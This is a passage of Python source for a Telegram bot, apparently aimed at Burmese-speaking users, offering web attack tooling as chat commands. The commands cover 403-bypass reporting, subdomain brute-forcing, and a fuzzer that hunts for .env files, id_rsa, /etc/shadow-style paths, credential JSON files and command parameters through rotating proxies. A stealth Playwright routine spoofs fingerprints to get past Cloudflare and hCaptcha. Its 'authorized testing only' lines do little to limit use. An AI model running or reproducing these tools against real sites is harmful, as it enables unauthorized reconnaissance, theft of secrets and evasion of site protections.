            lines.append(f"  • `{t}`: {c}")

    lines.append("\n⚠️ _Authorized testing only._")

    # ── Export JSON if bypasses found ────────────────
    if bypasses:
        import io
        report = json.dumps({
            "url": url, "baseline_status": baseline_st,
            "tested": tested, "bypasses_found": len(bypasses),
            "bypass_details": [{
                "label": b["label"], "method": b["method"],
                "status": b["status"], "size": b["size"],
                "technique": b["technique"],
                "location": b.get("headers",{}).get("Location",""),
            } for b in bypasses],
            "all_results": [{
                "label": r["label"], "method": r["method"],
                "status": r["status"], "size": r["size"],
            } for r in results],
        }, indent=2)
        buf = io.BytesIO(report.encode())
        try:
            await msg.edit_text("\n".join(lines), parse_mode='Markdown')
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=buf,
                filename=f"bypass403_{domain}_{ts}.json",
                caption=f"🔓 Bypass report — `{domain}` — `{len(bypasses)}` bypasses",
                parse_mode='Markdown'
            )
        except Exception:
            await update.effective_message.reply_text("\n".join(lines)[:4000], parse_mode='Markdown')
    else:
        await msg.edit_text("\n".join(lines), parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 📡  /subdomains — Advanced Subdomain Enumerator
# ══════════════════════════════════════════════════

_SUBDOMAIN_WORDLIST = [
    "www","mail","smtp","pop","imap","ftp","sftp","ssh","vpn","remote",
    "api","api2","api3","dev","dev2","staging","stage","beta","alpha","test",
    "admin","administrator","portal","panel","dashboard","manage","manager",
    "blog","shop","store","pay","payment","billing","invoice","checkout",
    "app","apps","mobile","m","wap","static","assets","cdn","media","img",
    "images","uploads","files","docs","docs2","help","support","kb","wiki",
    "status","monitor","grafana","prometheus","kibana","elastic","jenkins",
    "git","gitlab","github","bitbucket","jira","confluence","redmine",
    "internal","intranet","corp","corporate","private","secure","ssl",
    "login","auth","sso","oauth","id","identity","account","accounts",
    "db","database","mysql","postgres","redis","mongo","memcache","cache",
    "backup","old","legacy","v1","v2","v3","new","next","preview",
    "sandbox","demo","lab","labs","research","data","analytics","stats",
    "mx","mx1","mx2","ns","ns1","ns2","ns3","dns","dns1","dns2",
    "web","web1","web2","web3","server","server1","host","node","node1",
    "cloud","aws","azure","gcp","heroku","k8s","kubernetes","docker",
    "ci","cd","build","deploy","ops","devops","infra","infrastructure",
    "us","eu","asia","uk","au","jp","de","fr","ca","in","br",
    "prod","production","live","uat","qa","qas","rc","release",
    "autodiscover","autoconfig","cpanel","whm","plesk","webmail",
    "forum","forums","community","social","chat","slack","meet",
    "careers","jobs","press","news","events","about","contact",
]

def _subdomains_sync(domain: str, progress_q: list) -> dict:
    """Enumerate subdomains via crt.sh + DNS brute-force + HackerTarget."""
    results      = {"crtsh": [], "bruteforce": [], "hackertarget": [], "errors": []}
    found_all    = set()


    # ── Source 1: crt.sh (Certificate Transparency) ─
    progress_q.append("🔍 Querying crt.sh (Certificate Transparency)...")
    try:
        r = requests.get(
            f"https://crt.sh/?q=%.{domain}&output=json",
            timeout=15, headers={"Accept": "application/json"}
        )
        if r.status_code == 200:
            seen = set()
            for entry in r.json():
                names = entry.get("name_value", "").split("\n")
                for name in names:
                    name = name.strip().lower().lstrip("*.")
                    if name.endswith(f".{domain}") or name == domain:
                        sub = name.replace(f".{domain}", "").replace(domain, "")
                        if sub and sub not in seen and len(sub) < 60:
                            seen.add(sub)
                            results["crtsh"].append(name)
                            found_all.add(name)
            progress_q.append(f"✅ crt.sh: `{len(results['crtsh'])}` subdomains found")
    except Exception as e:
        results["errors"].append(f"crt.sh: {e}")

    # ── Source 2: HackerTarget API (free) ────────────
    progress_q.append("🔍 Querying HackerTarget API...")
    try:
        r = requests.get(
            f"https://api.hackertarget.com/hostsearch/?q={domain}",
            timeout=12
        )
        if r.status_code == 200 and "error" not in r.text.lower()[:30]:
            for line in r.text.strip().split("\n"):
                if "," in line:
                    hostname = line.split(",")[0].strip().lower()
                    if hostname.endswith(f".{domain}"):
                        found_all.add(hostname)
                        results["hackertarget"].append(hostname)
            progress_q.append(f"✅ HackerTarget: `{len(results['hackertarget'])}` found")
    except Exception as e:
        results["errors"].append(f"HackerTarget: {e}")

    # ── Source 3: DNS Brute-force ────────────────────
    progress_q.append(f"🔍 DNS brute-force ({len(_SUBDOMAIN_WORDLIST)} words)...")
    live_subs  = []
    wildcard_ip = None

    # Wildcard detection
    try:
        wc_ip = socket.gethostbyname(f"thissubdomaindoesnotexist99.{domain}")
        wildcard_ip = wc_ip
        progress_q.append(f"⚠️ Wildcard DNS detected (`{wc_ip}`) — filtering...")
    except socket.gaierror:
        pass

    def _check_sub(word):
        hostname = f"{word}.{domain}"
        try:
            ip = socket.gethostbyname(hostname)
            # Filter wildcard
            if wildcard_ip and ip == wildcard_ip:
                return None
            return (hostname, ip)
        except socket.gaierror:
            return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=25) as ex:
        futs = {ex.submit(_check_sub, w): w for w in _SUBDOMAIN_WORDLIST}
        done = 0
        for fut in concurrent.futures.as_completed(futs, timeout=45):
            done += 1
            if done % 50 == 0:
                progress_q.append(f"🔍 Brute-force: `{done}/{len(_SUBDOMAIN_WORDLIST)}` tested | `{len(live_subs)}` live")
            try:
                res = fut.result(timeout=4)
                if res:
                    hostname, ip = res
                    live_subs.append({"hostname": hostname, "ip": ip})
                    found_all.add(hostname)
            except Exception:
                pass

    results["bruteforce"] = live_subs
    progress_q.append(f"✅ Brute-force: `{len(live_subs)}` live subdomains")

    # ── Deduplicate and resolve all found ────────────
    all_unique = sorted(found_all)
    resolved   = {}
    for h in all_unique[:100]:
        try:
            resolved[h] = socket.gethostbyname(h)
        except Exception:
            resolved[h] = "unresolved"

    results["all_unique"]    = all_unique
    results["resolved"]      = resolved
    results["total_unique"]  = len(all_unique)
    results["wildcard_detected"] = wildcard_ip is not None

    return results


async def cmd_subdomains(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/subdomains <domain> — Advanced subdomain enumeration"""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/subdomains example.com`\n\n"
            "📡 *3 sources combined:*\n"
            "  ① crt.sh — Certificate Transparency logs (passive)\n"
            "  ② HackerTarget API — public dataset\n"
            f"  ③ DNS brute-force — {len(_SUBDOMAIN_WORDLIST)} wordlist\n\n"
            "🛡 Wildcard DNS auto-detection & filtering\n"
            "📦 Exports full list as `.txt` + `.json` files",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    raw = context.args[0].strip().replace("https://","").replace("http://","").split("/")[0].lower()

    # Basic domain validation
    if not re.match(r'^[a-z0-9][a-z0-9\-.]+\.[a-z]{2,}$', raw):
        await update.effective_message.reply_text("❌ Invalid domain format. Example: `example.com`", parse_mode='Markdown')
        return

    # SSRF: block private IPs for the apex domain
    try:
        apex_ip = socket.gethostbyname(raw)
        if not _is_safe_ip(apex_ip):
            await update.effective_message.reply_text(f"🚫 Private IP blocked: `{apex_ip}`", parse_mode='Markdown')
            return
    except socket.gaierror:
        pass  # domain may not have A record — still continue

    msg = await update.effective_message.reply_text(
        f"📡 *Subdomain Enumeration — `{raw}`*\n\n"
        f"① crt.sh (CT logs)\n② HackerTarget API\n"
        f"③ DNS brute-force ({len(_SUBDOMAIN_WORDLIST)} words)\n\n⏳",
        parse_mode='Markdown'
    )

    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(4)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"📡 *Enumerating `{raw}`*\n\n{txt}", parse_mode='Markdown')
                except Exception:
                    pass

    prog = asyncio.create_task(_prog())
    try:
        data = await asyncio.to_thread(_subdomains_sync, raw, progress_q)
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()

    total    = data["total_unique"]
    resolved = data["resolved"]
    crtsh_c  = len(data["crtsh"])
    ht_c     = len(data["hackertarget"])
    bf_c     = len(data["bruteforce"])
    wc       = data["wildcard_detected"]

    lines = [
        f"📡 *Subdomain Enumeration — `{raw}`*",
        f"━━━━━━━━━━━━━━━━━━━━",
        f"🔎 Total unique: `{total}`",
        f"  crt.sh:       `{crtsh_c}`",
        f"  HackerTarget: `{ht_c}`",
        f"  Brute-force:  `{bf_c}` live",
        f"{'⚠️ Wildcard DNS detected & filtered' if wc else '✅ No wildcard DNS'}\n",
    ]

    # Show top results
    if data["all_unique"]:
        lines.append("*Found Subdomains:*")
        for h in data["all_unique"][:30]:
            ip = resolved.get(h, "?")
            # Flag interesting ones
            flag = ""
            for keyword in ("dev","staging","admin","internal","test","beta","old","backup","api"):
                if keyword in h:
                    flag = " 🔴"
                    break
            lines.append(f"  `{h}` → `{ip}`{flag}")
        if total > 30:
            lines.append(f"  _…and {total-30} more in export file_")

    lines.append("\n📦 _Full list exported below_")

    await msg.edit_text("\n".join(lines), parse_mode='Markdown')

    # ── Export files ──────────────────────────────────
    import io
    txt_content  = "\n".join(
        f"{h}\t{resolved.get(h,'?')}" for h in data["all_unique"]
    )
    json_content = json.dumps({
        "domain": raw, "scanned_at": datetime.now().isoformat(),
        "total_unique": total, "wildcard_detected": wc,
        "sources": {"crtsh": crtsh_c, "hackertarget": ht_c, "bruteforce": bf_c},
        "subdomains": [{
            "hostname": h, "ip": resolved.get(h,"?"),
            "interesting": any(k in h for k in ("dev","staging","admin","internal","test","backup","api"))
        } for h in data["all_unique"]],
    }, indent=2)

    import zipfile as _zf2
    zip_buf = io.BytesIO()
    ts      = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_d  = re.sub(r'[^\w\-]', '_', raw)
    with _zf2.ZipFile(zip_buf, 'w', _zf2.ZIP_DEFLATED) as zf:
        zf.writestr("subdomains.txt",  txt_content.encode())
        zf.writestr("subdomains.json", json_content.encode())
        interesting = [h for h in data["all_unique"]
                       if any(k in h for k in ("dev","staging","admin","internal","test","backup","api"))]
        zf.writestr("interesting.txt", "\n".join(interesting).encode())
    zip_buf.seek(0)

    await context.bot.send_document(
        chat_id=update.effective_chat.id,
        document=zip_buf,
        filename=f"subdomains_{safe_d}_{ts}.zip",
        caption=(
            f"📡 *Subdomains — `{raw}`*\n"
            f"Total: `{total}` | Interesting: `{len(interesting)}`\n"
            f"Files: `subdomains.txt` + `interesting.txt` + `subdomains.json`"
        ),
        parse_mode='Markdown'
    )


# ══════════════════════════════════════════════════
# 🧪  /fuzz — HTTP Path & Parameter Fuzzer
# ══════════════════════════════════════════════════

_FUZZ_PATHS = [
    # Hidden admin / debug
    "admin","administrator","admin.php","admin/login","login","login.php",
    "dashboard","panel","control","manage","manager","cpanel","wp-admin",
    "debug","test","testing","dev","development","staging","beta","old",
    # Backup files
    "backup","backup.zip","backup.sql","dump.sql","db.sql","site.zip",
    "index.php.bak","index.html.bak","config.php.bak",".env",".env.bak",
    ".env.example",".env.local",".env.production",
    # Info disclosure
    "info.php","phpinfo.php","server-info","server-status","status",
    "health","ping","version","api/version","build","trace",
    # Source leaks
    ".git","git/config",".svn","web.config",".htaccess","crossdomain.xml",
    "robots.txt","sitemap.xml","humans.txt","security.txt",
    ".well-known/security.txt","readme.md","README.md","CHANGELOG.md",
    # CMS paths
    "wp-login.php","wp-config.php","xmlrpc.php","wp-json",
    "joomla","wp-content/debug.log","config/database.yml",
    "configuration.php","config.php","config.yml","config.json",
    "settings.py","database.yml","credentials.json","secrets.json",
    # API
    "api","api/v1","api/v2","api/v3","api/users","api/admin","graphql",
    "swagger.json","openapi.json","api-docs","redoc","swagger-ui.html",
    # Logs
    "error.log","access.log","debug.log","app.log","laravel.log",
    "storage/logs/laravel.log","logs/error.log","var/log/app.log",
    # Common uploads/files
    "uploads","files","static","assets","media","public",
    "download","downloads","export","exports","report","reports",
    # Framework specific
    "actuator","actuator/health","actuator/env","actuator/mappings",
    "metrics","prometheus","grafana","kibana","phpmyadmin","adminer.php",
    # Common hidden files
    "id_rsa","id_rsa.pub","authorized_keys","known_hosts",
    "passwd","shadow","hosts","resolv.conf",
]

_FUZZ_PARAMS = [
    "id","user","username","email","file","path","page","url","redirect",
    "next","return","callback","debug","test","admin","token","key","secret",
    "cmd","exec","command","query","search","q","type","action","method",
    "format","output","lang","language","locale","theme","template","view",
    "include","require","load","src","source","data","payload","input",
    "name","pass","password","hash","sig","signature","auth","session",
    "api_key","access_token","refresh_token","client_id","client_secret",
]

def _fuzz_sync(base: str, mode: str, progress_q: list) -> tuple:
    """Improved fuzzer — tech-aware + backup ext + param + response diff."""
    found = []

    # Baseline fingerprint
    try:
        r404 = requests.get(
            base.rstrip("/") + "/this_path_will_never_exist_xyz_abc_123",
            timeout=6, verify=False, headers=_get_headers(),
            proxies=proxy_manager.get_proxy()
        )
        baseline_status = r404.status_code
        baseline_size   = len(r404.content)
        baseline_hash   = hashlib.md5(r404.content[:512]).hexdigest()
        baseline_words  = len(r404.text.split()) if r404.text else 0
    except Exception:
        baseline_status, baseline_size, baseline_hash, baseline_words = 404, 0, "", 0

    def _is_interesting(r_status, r_size, r_hash, r_words):
        if r_status == baseline_status:
            if r_hash and r_hash == baseline_hash:
                return False
            if baseline_size > 0 and abs(r_size - baseline_size) < 50:
                return False
            if baseline_words > 0 and abs(r_words - baseline_words) < 5:
                return False
        return r_status in (200, 201, 204, 301, 302, 307, 401, 403, 500)

    def _probe(target_url):
        try:
            r = requests.get(
                target_url, timeout=5, verify=False,
                headers=_get_headers(), allow_redirects=True,
                stream=True, proxies=proxy_manager.get_proxy()
            )
            chunk = b""
            for part in r.iter_content(2048):
                chunk += part
                if len(chunk) >= 2048:
                    break
            r.close()
            r_size  = int(r.headers.get("Content-Length", len(chunk)))
            r_hash  = hashlib.md5(chunk[:512]).hexdigest()
            r_ct    = r.headers.get("Content-Type", "")[:40]
            r_words = len(chunk.decode("utf-8", "ignore").split())

            if _is_interesting(r.status_code, r_size, r_hash, r_words):
                gated = r.status_code in (401, 403)
                return {
                    "url":    target_url,
                    "status": r.status_code,
                    "size":   r_size,
                    "ct":     r_ct,
                    "gated":  gated,
                    "title":  "",
                }
        except Exception:
            pass
        return None

    if mode == "params":
        # Param fuzzing with multiple values
        targets = []
        for param, values in _SMART_FUZZ_PARAMS.items():
            for val in values[:2]:
                targets.append(f"{base}?{param}={val}")
        # Also original params
        for p in _FUZZ_PARAMS:
            targets.append(f"{base}?{p}=FUZZ")
    else:
        base_paths = list(_FUZZ_PATHS)
        # Tech-aware extras
        detected = _detect_tech_stack(base)
        if detected:
            progress_q.append(f"🔬 Detected: `{'`, `'.join(detected)}`")
        for tech in detected:
            base_paths.extend(_TECH_WORDLISTS.get(tech, []))

        # Backup extension permutations (on top 30 paths)
        backup_targets = []
        for path in base_paths[:30]:
            for ext in _BACKUP_EXTENSIONS:
                backup_targets.append(path.rstrip("/") + ext)

        targets = [f"{base.rstrip('/')}/{p}" for p in base_paths]
        targets += [f"{base.rstrip('/')}/{p}" for p in backup_targets]

    done = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
        fmap = {ex.submit(_probe, t): t for t in targets}
        for fut in concurrent.futures.as_completed(fmap, timeout=120):
            done += 1
            if done % 25 == 0:
                progress_q.append(
                    f"🧪 Fuzzing `{done}/{len(targets)}` | Found: `{len(found)}`"
                )
            try:
                res = fut.result(timeout=8)
                if res:
                    found.append(res)
            except Exception:
                pass

    # Sort: 200 first, then gated (401/403), then rest
    found.sort(key=lambda x: (x["status"] != 200, not x.get("gated"), x["status"]))
    return found, baseline_status


_ASSET_CATEGORIES = {
    "images":   {'.png','.jpg','.jpeg','.gif','.webp','.svg','.bmp','.ico','.avif'},
    "audio":    {'.mp3','.wav','.ogg','.aac','.flac','.m4a','.opus'},
    "video":    {'.mp4','.webm','.mkv','.avi','.mov','.m4v','.3gp'},
    "layouts":  {'.xml'},
    "dex":      {'.dex'},
    "so_libs":  {'.so'},
    "fonts":    {'.ttf','.otf','.woff','.woff2'},
    "certs":    {'.pem','.cer','.crt','.p12','.pfx','.keystore','.jks'},
    "configs":  {'.json','.yaml','.yml','.properties','.cfg','.conf','.ini'},
    "scripts":  {'.js','.py','.sh','.rb','.php'},
    "docs":     {'.pdf','.txt','.md','.html','.htm'},
    "archives": {'.zip','.tar','.gz','.rar','.7z'},
}

def _categorize_asset(filename: str) -> str:
    ext = os.path.splitext(filename.lower())[1]
    for cat, exts in _ASSET_CATEGORIES.items():
        if ext in exts:
            return cat
    return "other"

def _extract_apk_assets_sync(filepath: str, wanted_cats: set, progress_cb=None) -> dict:
    """Extract assets from APK/IPA/ZIP by category."""
    result = {"files": {}, "stats": {}, "errors": []}

    if not zipfile.is_zipfile(filepath):
        result["errors"].append("Not a valid ZIP/APK/IPA file")
        return result

    with zipfile.ZipFile(filepath, 'r') as zf:
        names = zf.namelist()
        total = len(names)
        categorized = {}
        for name in names:
            cat = _categorize_asset(name)
            if cat in wanted_cats:
                categorized.setdefault(cat, []).append(name)

        result["stats"]["total_files"] = total
        for cat, files in categorized.items():
            result["stats"][cat] = len(files)

        # Extract to BytesIO zip
        import io
        out_buf = io.BytesIO()
        extracted = 0
        MAX_EXTRACT = 200  # max files per export
        with zipfile.ZipFile(out_buf, 'w', zipfile.ZIP_DEFLATED) as out_zf:
            for cat in wanted_cats:
                files = categorized.get(cat, [])
                for i, fname in enumerate(files[:MAX_EXTRACT]):
                    try:
                        data = zf.read(fname)
                        # Flatten long paths
                        short_name = f"{cat}/{os.path.basename(fname)}"
                        out_zf.writestr(short_name, data)
                        extracted += 1
                        if progress_cb and extracted % 20 == 0:
                            progress_cb(f"📦 Extracting... `{extracted}` files")
                    except Exception as e:
                        result["errors"].append(f"{fname}: {e}")

        result["extracted"] = extracted
        result["zip_buffer"] = out_buf
    return result


async def cmd_appassets(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/appassets — Extract specific asset types from uploaded APK/IPA/ZIP"""
    uid = update.effective_user.id

    # Force join check
    if not await check_force_join(update, context):
        return

    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    # Check if user has a recently uploaded file
    async with db_lock:
        db = _load_db_sync()
    u = get_user(db, uid)
    last_app = u.get("last_uploaded_app")

    if not last_app or not os.path.exists(last_app):
        await update.effective_message.reply_text(
            "📦 *APK Asset Extractor*\n\n"
            "APK / IPA / ZIP / JAR ဖိုင်ကို ဦးစွာ Chat ထဲ Upload လုပ်ပါ\n"
            "Upload ပြီးရင် `/appassets` ကို ရိုက်ပြီး Category ရွေးပါ\n\n"
            "Extract လုပ်နိုင်သော Category များ:\n"
            "🖼 `images` — PNG, JPG, SVG, WebP\n"
            "🎵 `audio` — MP3, WAV, OGG, AAC\n"
            "🎬 `video` — MP4, WebM, MKV\n"
            "📐 `layouts` — XML Layout files\n"
            "⚙️ `dex` — classes.dex (bytecode)\n"
            "🔧 `so_libs` — .so Native libraries\n"
            "🔤 `fonts` — TTF, OTF, WOFF\n"
            "🔒 `certs` — PEM, CER, Keystores\n"
            "📋 `configs` — JSON, YAML, Properties\n"
            "📝 `scripts` — JS, Python, Shell\n"
            "📄 `docs` — PDF, TXT, HTML\n"
            "🗜 `archives` — ZIP, TAR, GZ",
            parse_mode='Markdown'
        )
        return

    # Parse category args
    valid_cats = set(_ASSET_CATEGORIES.keys())
    wanted_cats = set()
    if context.args:
        for a in context.args:
            a = a.lower().strip()
            if a == "all":
                wanted_cats = valid_cats.copy()
                break
            if a in valid_cats:
                wanted_cats.add(a)

    if not wanted_cats:
        # Build selection keyboard
        rows = []
        cats_list = list(valid_cats)
        for i in range(0, len(cats_list), 3):
            row = [InlineKeyboardButton(c, callback_data=f"apa_{c}") for c in cats_list[i:i+3]]
            rows.append(row)
        rows.append([InlineKeyboardButton("📦 ALL Categories", callback_data="apa_all")])
        await update.effective_message.reply_text(
            "📦 *Extract လုပ်မည့် Category ရွေးပါ:*\n\n"
            "_(သို့မဟုတ်)_ `/appassets images audio layouts` ဟု ရိုက်နိုင်သည်",
            reply_markup=InlineKeyboardMarkup(rows),
            parse_mode='Markdown'
        )
        return

    await _do_appassets_extract(update, context, last_app, wanted_cats)


async def _do_appassets_extract(update_or_msg, context, filepath: str, wanted_cats: set):
    import io
    # Support both Update objects and raw Message objects
    if hasattr(update_or_msg, 'effective_message'):
        target_msg  = update_or_msg.effective_message
        chat_id     = update_or_msg.effective_chat.id
    else:
        # Raw Message (from callback)
        target_msg  = update_or_msg
        chat_id     = update_or_msg.chat_id

    fname = os.path.basename(filepath)
    msg = await target_msg.reply_text(
        f"📦 *Asset Extractor — `{fname}`*\n\n"
        f"Categories: `{', '.join(sorted(wanted_cats))}`\n"
        "⏳ Extracting...",
        parse_mode='Markdown'
    )
    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"📦 *Extracting `{fname}`*\n\n{txt}", parse_mode='Markdown')
                except Exception:
                    pass

    prog = asyncio.create_task(_prog())
    try:
        result = await asyncio.to_thread(
            _extract_apk_assets_sync, filepath, wanted_cats,
            lambda t: progress_q.append(t)
        )
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()

    if result.get("errors") and result.get("extracted", 0) == 0:
        _err_txt = '\n'.join(result['errors'][:3])
        await msg.edit_text(f"❌ `{_err_txt}`", parse_mode='Markdown')
        return

    stats = result["stats"]
    extracted = result.get("extracted", 0)
    zip_buf: io.BytesIO = result.get("zip_buffer")

    if extracted == 0:
        stat_lines = "\n".join(f"  {cat}: `0`" for cat in sorted(wanted_cats))
        await msg.edit_text(
            f"📭 *No files found*\n\nCategory တွေမှာ ဖိုင် မတွေ့ပါ:\n{stat_lines}",
            parse_mode='Markdown'
        )
        return

    stat_lines = "\n".join(
        f"  {cat}: `{stats.get(cat, 0)}`" for cat in sorted(wanted_cats)
    )
    zip_buf.seek(0)
    zip_size_mb = zip_buf.getbuffer().nbytes / 1024 / 1024

    await msg.edit_text(
        f"✅ *Extraction ပြီးပါပြီ*\n\n"
        f"📦 Extracted: `{extracted}` files\n"
        f"💾 Size: `{zip_size_mb:.2f}` MB\n\n"
        f"*Per Category:*\n{stat_lines}\n\n"
        "📤 ZIP upload နေပါသည်...",
        parse_mode='Markdown'
    )

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_fname = re.sub(r'[^\w\-]', '_', os.path.splitext(os.path.basename(filepath))[0])
    zip_name = f"assets_{safe_fname}_{ts}.zip"

    try:
        await context.bot.send_document(
            chat_id=chat_id,
            document=zip_buf,
            filename=zip_name,
            caption=(
                f"📦 *APK Assets — `{os.path.basename(filepath)}`*\n"
                f"📂 `{extracted}` files extracted\n"
                f"💾 `{zip_size_mb:.2f}` MB\n"
                f"Categories: `{', '.join(sorted(wanted_cats))}`"
            ),
            parse_mode='Markdown'
        )
    except Exception as e:
        await target_msg.reply_text(f"❌ Upload error: `{e}`", parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 🤖  FEATURE 10 — Anti-Bot & Captcha Bypass (/antibot)
# ══════════════════════════════════════════════════

async def cmd_antibot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/antibot <url> — Cloudflare/hCaptcha bypass via Playwright Stealth"""
    if not await check_force_join(update, context):
        return

    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/antibot https://example.com`\n\n"
            "🤖 *Bypass Methods:*\n"
            "  ① Human-like mouse movement + delay simulation\n"
            "  ② Random viewport + timezone spoofing\n"
            "  ③ Canvas/WebGL fingerprint randomization\n"
            "  ④ Stealth Playwright (navigator.webdriver=false)\n"
            "  ⑤ Cloudflare Turnstile passive challenge wait\n"
            "  ⑥ hCaptcha detection + fallback screenshot\n\n"
            "⚙️ *Requirements:*\n"
            "  `pip install playwright && playwright install chromium`\n\n"
            "⚠️ _Authorized testing only_",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    if not PLAYWRIGHT_OK:
        await update.effective_message.reply_text(
            "❌ *Playwright မရှိသေးပါ*\n\n"
            "Setup:\n"
            "```\npip install playwright\nplaywright install chromium\n```",
            parse_mode='Markdown'
        )
        return

    domain = urlparse(url).netloc
    msg = await update.effective_message.reply_text(
        f"🤖 *Anti-Bot Bypass — `{domain}`*\n\n"
        "① Stealth mode on\n"
        "② Human-like behavior injecting...\n"
        "③ Waiting for challenge...\n⏳",
        parse_mode='Markdown'
    )

    def _run_antibot():
        """Playwright stealth — navigator.webdriver hidden, human-like timing"""
        if not PLAYWRIGHT_OK:
            return {"success": False, "error": "Playwright not available"}
        try:
            from playwright.sync_api import sync_playwright
            with sync_playwright() as pw:
                browser = pw.chromium.launch(
                    headless=True,
                    args=["--no-sandbox", "--disable-dev-shm-usage",
                          "--disable-blink-features=AutomationControlled", "--disable-gpu"]
                )
                ctx = browser.new_context(
                    user_agent=(
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                        "AppleWebKit/537.36 (KHTML, like Gecko) "
                        "Chrome/122.0.0.0 Safari/537.36"
                    ),
                    viewport={"width": 1366, "height": 768},
                    locale="en-US",
                    timezone_id="America/New_York",
                    ignore_https_errors=True,
                )
                ctx.add_init_script("""
                    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                    window.chrome = {runtime: {}};
                    Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
                    Object.defineProperty(navigator, 'languages', {get: () => ['en-US','en']});
                    const orig = HTMLCanvasElement.prototype.toDataURL;
                    HTMLCanvasElement.prototype.toDataURL = function(...args) {
                        const ctx2 = this.getContext('2d');
                        if (ctx2) {
                            const d = ctx2.getImageData(0,0,1,1);
                            d.data[0] = Math.floor(Math.random()*10);
                            ctx2.putImageData(d,0,0);
                        }
                        return orig.apply(this, args);
                    };
                """)
                page = ctx.new_page()
                # Human-like mouse movement
                page.mouse.move(300 + int(200 * 0.5), 200 + int(100 * 0.5))
                try:
                    page.goto(url, wait_until="networkidle", timeout=60_000)
                except Exception:
                    try:
                        page.goto(url, wait_until="load", timeout=40_000)
                    except Exception:
                        pass
                page.wait_for_timeout(2500)
                html = page.content()
                browser.close()
                if html and html.strip():
                    return {"success": True, "html": html, "method": "stealth_playwright"}
                return {"success": False, "error": "Empty response"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    try:
        res = await asyncio.to_thread(_run_antibot)
    except Exception as e:
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return

    if not res["success"]:
        await msg.edit_text(
            f"❌ *Bypass မအောင်မြင်ဘူး*\n\n"
            f"Error: `{res['error']}`\n\n"
            "_Challenge level မြင့်လွန်းနိုင်သည် သို့မဟုတ် manual CAPTCHA solve လိုနိုင်ပါသည်_",
            parse_mode='Markdown'
        )
        return

    html = res["html"]
    method = res.get("method", "unknown")
    html_size_kb = len(html.encode()) / 1024

    # Save and send as file
    import io
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_d = re.sub(r'[^\w\-]', '_', domain)
    html_buf = io.BytesIO(html.encode('utf-8', errors='replace'))

    await msg.edit_text(
        f"✅ *Bypass အောင်မြင်ပါပြီ!*\n\n"
        f"🌐 `{domain}`\n"
        f"⚙️ Method: `{method}`\n"
        f"📄 HTML Size: `{html_size_kb:.1f}` KB\n\n"
        "📤 HTML file upload နေပါသည်...",
        parse_mode='Markdown'
    )

    try:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=html_buf,
            filename=f"antibot_{safe_d}_{ts}.html",
            caption=(
                f"🤖 *Anti-Bot Bypass — `{domain}`*\n"
                f"Method: `{method}`\n"
                f"Size: `{html_size_kb:.1f}` KB"
            ),
            parse_mode='Markdown'
        )
    except Exception as e:
        await update.effective_message.reply_text(f"❌ Upload: `{e}`", parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 🗂️  FEATURE 11 — Smart Context-Aware Fuzzer (/smartfuzz)
#     CeWL-style wordlist generator + fuzzer
# ══════════════════════════════════════════════════

_SMARTFUZZ_STOP_WORDS = {
    'the','a','an','in','on','at','for','of','to','is','are','was','were',
    'and','or','but','if','with','this','that','from','by','not','it',
    'be','as','we','you','he','she','they','have','has','had','do','does',
    'did','will','would','could','should','may','might','can','our','your',
    'their','its','which','who','what','how','when','where','why',
}

def _build_context_wordlist(url: str, progress_cb=None) -> tuple:
    """
    CeWL-style: scrape target, extract unique words → generate permutations.
    Returns (wordlist: list, raw_words: list)
    """
    parsed = urlparse(url)
    root   = f"{parsed.scheme}://{parsed.netloc}"
    domain_parts = parsed.netloc.replace('www.', '').split('.')

    all_words = set()

    # ── Scrape homepage + up to 3 internal pages ──
    try:
        r = requests.get(url, headers=_get_headers(), timeout=12, verify=False, proxies=proxy_manager.get_proxy())
        soup = BeautifulSoup(r.text, 'html.parser')
        if progress_cb:
            progress_cb("🌐 Homepage scraped")

        # Extract text words
        for tag in soup.find_all(['h1','h2','h3','h4','title','p','li','span','a','button','label']):
            text = tag.get_text(separator=' ')
            for w in re.findall(r'[a-zA-Z0-9_\-]{3,20}', text):
                all_words.add(w.lower())

        # Extract from meta tags
        for meta in soup.find_all('meta'):
